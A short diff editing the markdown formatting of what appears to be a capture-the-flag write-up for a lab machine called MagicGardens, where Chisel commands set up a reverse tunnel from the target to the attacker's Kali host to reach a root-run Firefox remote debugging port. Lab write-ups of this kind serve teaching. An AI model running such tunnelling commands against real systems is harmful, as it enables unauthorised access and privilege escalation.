@@ -309,9 +309,9 @@ root        1936  4.9 11.6 11875692 467716 ?     Sl   May20  16:51              
 I proceeded to use Chisel to set up port forwarding to gain access from my local machine. Here's what I did after transferring Chisel to the Linux box:
 
 1. On my Kali machine: **`./chisel server -p 8000 --reverse`**
-2. On the target machine: **`./chisel client 10.10.14.46:8000 R:**34001**:127.0.0.1:**34001`
+2. On the target machine: **`./chisel client 10.10.14.46:8000 R:34001:127.0.0.1:34001`**
 
-Once completed, we can access the Firefox remote debugging port at **`localhost:**34001`. This should enable us to interact with the Firefox process running as root on the target machine.
+Once completed, we can access the Firefox remote debugging port at **`localhost:34001`**. This should enable us to interact with the Firefox process running as root on the target machine.
 
 ![Untitled](MagicGardens%201b6964f094494bd08cf342e4e656dfd6/Untitled%207.png)
 
